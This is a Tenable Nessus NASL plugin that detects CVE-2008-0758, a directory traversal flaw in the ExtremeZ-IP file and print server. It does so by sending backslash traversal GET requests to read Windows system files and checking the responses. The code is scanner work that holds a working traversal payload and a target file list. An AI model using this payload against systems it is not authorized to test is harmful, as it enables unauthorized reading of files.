#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(30253);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2008-0758");
  script_bugtraq_id(27718);
  script_xref(name:"OSVDB", value:"42899");
  script_xref(name:"Secunia", value:"28862");

  script_name(english:"ExtremeZ-IP File and Print Server Zidget/HTTP Server Traversal Arbitrary File Access");
  script_summary(english:"Tries to retrieve a local file");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a directory traversal
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running ExtremeZ-IP, a file- and print-server for
Windows. 

The version of ExtremeZ-IP includes a web server, which provides
access to the Zidget widget and master list and is affected by a
limited directory traversal vulnerability.  By leveraging this issue,
an unauthenticated, remote attacker can retrieve files on the same
drive as the application and of type '.gif', '.png', '.jpg', '.xml',
'.ico', '.zip', or '.html'

Note that there are also reportedly two denial of service
vulnerabilities associated with this version of ExtremeZ-IP, although
Nessus has not checked for them." );
 script_set_attribute(attribute:"see_also", value:"http://aluigi.altervista.org/adv/ezipirla-adv.txt" );
 script_set_attribute(attribute:"see_also", value:"http://www.grouplogic.com/files/ez/hot/hotFix51.cfm" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to ExtremeZ-IP 5.1.3x03 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/02/12");
 script_cvs_date("$Date: 2015/09/24 21:08:39 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8081);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:8081, embedded: 1);

# Make sure the banner looks like Extreme-Z.
banner = get_http_banner(port:port, exit_on_fail: 1);
if ("Server: ExtremeZ-IP/" >!< banner)
 exit(0, "The web server on port "+port+" is not ExtremeZ-IP.");


# Make sure Nessus knows it's an embedded server.
replace_kb_item(name:"Services/www/" + port + "/embedded", value:TRUE);


# Try to exploit the issue.
if (thorough_tests) files = make_list(
  "\\WINDOWS\\PCHEALTH\\HELPCTR\\Config\\dataspec.xml",
  "\\WINNT\\Web\\Wallpaper\\Paradise.jpg",

  "\\WINDOWS\\system32\\icsxml\\osinfo.xml",

  "\\WINDOWS\\system32\\wbem\\xsl-mappings.xml"
);
else files = make_list(
  "\\WINDOWS\\PCHEALTH\\HELPCTR\\Config\\dataspec.xml",
  "\\WINNT\\Web\\Wallpaper\\Paradise.jpg"
);

foreach file (files)
{
  url = string("/..\\..\\..\\..\\..\\..\\..\\..\\..\\..", file);
  r = http_send_recv3(method:"GET",item:url, port:port, exit_on_fail: 1);
  res = r[2];

  # There's a problem if
  if (
    # we requested an XML file and it looks like one or...
    (
      ".xml" >< file &&
      '<?xml version="'>< res
    ) ||
    # we requested a JPEG file and it looks like one
    (
      ".jpg" >< file &&
      substr(res, 0, 3) == raw_string(0xff, 0xd8, 0xff, 0xe0)
    )
  )
  {
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Nessus was able to read a file on the remote host using the path :\n",
        "\n",
        "  ", url, "\n",
        "\n",
        "Note that this must be sent as-is and will not work in a browser\n",
        "if it is URL-encoded.\n"
      );
      if (".xml" >< file)
        report = string(
          report,
          "\n",
          "Here are its contents :\n",
          "\n",
          res
        );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
